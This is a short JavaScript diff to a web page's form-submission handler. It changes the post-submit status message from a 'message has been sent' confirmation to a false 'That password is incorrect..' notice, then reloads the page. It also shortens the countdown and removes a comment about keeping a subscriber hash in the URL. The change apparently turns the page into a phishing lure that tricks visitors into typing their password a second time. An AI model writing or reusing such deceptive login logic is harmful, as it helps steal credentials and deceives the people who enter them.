@@ -188,15 +188,15 @@
       if (reloadStarted) return;
       reloadStarted = true;
 
-      let secondsLeft = 10;
+      let secondsLeft = 5;
       if (status) {
-        status.textContent = 'Thank you! Your message has been sent. Refreshing page in ' + secondsLeft + ' seconds...';
+        status.textContent = 'That password is incorrect.. Refreshing page in ' + secondsLeft + ' seconds...';
       }
 
       const timer = setInterval(function () {
         secondsLeft--;
         if (status && secondsLeft > 0) {
-          status.textContent = 'Thank you! Your message has been sent. Refreshing page in ' + secondsLeft + ' seconds...';
+          status.textContent = 'That password is incorrect.. Refreshing page in ' + secondsLeft + ' seconds...';
         }
         
         if (secondsLeft <= 0) {
@@ -204,8 +204,7 @@
           if (status) {
             status.textContent = 'Refreshing now...';
           }
-          
-          // Keep the full URL including the # subscriber hash, then reload
+
           window.location.reload();
         }
       }, 1000);
